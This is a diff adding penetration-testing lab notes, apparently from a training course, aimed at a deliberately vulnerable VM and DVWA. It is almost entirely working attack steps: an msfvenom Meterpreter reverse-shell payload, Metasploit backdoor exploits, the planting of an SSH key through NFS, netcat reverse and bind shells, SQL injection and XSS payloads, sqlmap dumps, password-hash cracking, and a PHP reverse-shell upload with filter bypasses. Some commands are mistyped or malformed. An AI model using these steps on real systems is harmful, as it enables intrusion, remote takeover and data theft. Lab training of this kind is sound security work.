@@ -1,0 +1,228 @@
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.46 lport=443 -f exe -o winpra.exe
+
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tc
+set lhost 192.168.1.46
+set lport 443
+options
+exploit -j
+sessions -i
+---------------------------------------------------------------------
+searchsploit vsftpd 2.3.4
+
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set rhosts 192.168.1.80
+exploit
+------------------------------------------------------------------
+
+enum4linux -a 192.168.1.80
+smbclient -L //192.168.1.80
+smbclient //192.168.1.80/tmp
+cd rootfs\
+
+msfconsole
+use auxiliary/admin/smb/samba_symlink_traversal
+options
+set rhosts 192.168.1.80
+set smbshare tmp
+exploit
+
+cd rootfs\root\.ssh\
+
+mkdir /tmp/mnt
+mount -t nfs 192.168.1.80:/ /tmp/mnt/
+cd /tmp/mnt/
+ls
+cd root/.ssh/
+cat /root/.ssh/id_rsa.pub >> authorized_keys
+
+ssh 192.168.1.80
+rlogin 192.168.1.80
+------------------------------------------------------------------------
+searchsploit UnrealIRCd
+
+msfconsole
+use exploit/unix/irc/unreal_ircd_3281_backdoor 
+set rhosts 192.168.1.80
+exploit
+
+---------------------------------------------------------------------------
+
+gedit /etc/snort/snort.conf
+(line51) put ip in homenet (192.168.1.46/24) 
+snort -T -i eth0 -c /etc/snort/snort.conf
+gedit /etc/snort/rules/local.rules
+alert icmp any any -> $HOME_NET any (msg:"ICMP block"; sid:1000000; rev:1; classtype:icmp-event; Priority:2;)
+
+snort -A console -q -c /etc/snort/snort.conf -i eth0
+iptables -A input -p tcp -m state --state new recent --update --second 60 -hitcount 20 -j drop
+iptables -A input -p tcp -dport 80 -j drop
+
+-------------------------
+target 
+nc -nlvp 8855 -e /bin/bash/ &
+
+attacker
+nc -nv (target ip) (port)
+ 
+--------------------------
+attacker
+nc -nlvp 6655 
+
+target 
+nc -nv (attacker ip) (port) -e /bin/bash
+
+------------------------------------------------------
+DVWA 
+
+curl -fsSL https://get.docker.com -o get-docker.sh  
+sh get-docker.sh
+
+sudo docker run --rm -it -p 5566:80 vulnerables/web-dvwa &
+
+----------------------------------------------------------------------------
+SQL Injection 
+low 
+all users 
+1' or 1=1 #
+
+version of sql 
+1' or 1=1 union select null,version()#
+
+display databases users
+1' or 1=1 union select null,user()#
+
+database name 
+1' or 1=1 union select null,database()#
+
+show tables 
+1' or 1=0 union select null,table_name from information_schema.tables#
+
+show show table colm
+1' or 1=0 union select table_name,column_name from information_schema.columns where table_names='users'#
+
+to print users and password 
+1' and 1=0 union select user,password from users#
+
+copy hash in one file
+john dvwahash --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
+------------------------------------ 
+SQL MEDIUM
+capture in burp suit put (all command as sql injection low)
+1 and 1=0 union select user,password from users#
+
+---------------------------------
+SQL HIGH
+same command as low 
+------------------------------------
+
+SQL BLIND 
+LOW
+
+on burp suit capture packet 
+copy it in a file 
+sqlmap -r (filename) --dump
+
+_________________
+SQL BLIND
+MEDIUM
+sqlmap -u "http://192.168.1.156:5588/vulnerabilities/sqli/" --cookie="PHPSESSID=6rdovi1f1ma5mseis8ehi2i2v4; security=medium" --data="id=2&Submit=Submit" --dump
+
+sqlmap -u "http://192.168.1.156:5588/vulnerabilities/sqli/" --cookie="PHPSESSID=6rdovi1f1ma5mseis8ehi2i2v4; security=medium" --data="id=3&Submit=Submit" --dbms=mysql -D dvwa -tables
+
+
+
+-----------------------------------------------
+SQL BLIND 
+HIGH
+sqlmap -u "http://192.168.1.156:5588/vulnerabilities/sqli_blind/cookie-input.php" --cookie="PHPSESSID=6rdovi1f1ma5mseis8ehi2i2v4; security=high" --data="id=1&Submit=Submit" --level=5 --risk=3
+(no output)
+---------------------------
+XSS (reflected)
+low
+<script>alert(0)</script>
+<script>alert(document.cookie)</script>
+
+------------------
+XSS(reflected)
+medium
+make any letter capital
+<Script>alert(0)</Script>
+
+-------------------------------------
+XSS (reflected)
+HIGH
+<body onload=alert("iacsd")>
+-----------------------------------
+XSS (DOM)
+LOW
+http://192.168.1.156:5588/vulnerabilities/xss_d/?default=<script>alert(0)</script>
+
+-----------------------------------------------------------------------
+XSS (DOM)
+MEDIUM
+http://192.168.1.156:5588/vulnerabilities/xss_d/?default=</option></select><body onload=alert("IACSD")>
+--------------------------------------------------------------
+XSS (DOM)
+HIGH
+(choose different language)
+http://192.168.1.156:5588/vulnerabilities/xss_d/?default=English#<script>alert(0)</script>
+-----------------------------------------------------------------------------
+XSS (STORED)
+LOW
+name:zxnhcjkasd
+message:<script>alert(0)</script>
+
+--------------------------------------------
+XSS (STORED)
+MEDIUM
+change element size to 100 by source code
+name :<sCript>alert(0)</sCript>
+message: fhjksd
+
+-----------------------------------------------------------------------------------
+XSS (STORED)
+HIGH
+name:<body onload=alert(0)>
+message:dsjkhvfds
+
+-----------------------------------------------------------------------------------
+FILE UPLOAD
+low
+cp /usr/share/webshells/php/php-reverse-shell.php groot.php
+nano groot.php change ip & port
+open port on kali using nc -nlvp port
+upload file and run
+------------------------------------------------------------------------------------
+FILE UPLOAD
+MEDIUM
+change file name to sheel.jepg.php
+
+capture in burp suit 
+change content type : image/jpeg
+leave one line
+GIF98
+forward
+
+open port on kali using nc -nlvp port
+run file
+
+_----------------------------------------------------------------------------
+
+FILE UPLOAD
+HIGH
+
+add GIF98
+change file extension to tool.jpeg
+upload 
+
+command injection
+1.1.1.1|mv /var/www/html/hackable/uploads/tools.jpeg /var/www/html/hackable/uploads/tools.php
+
+run 
+
+
+
+
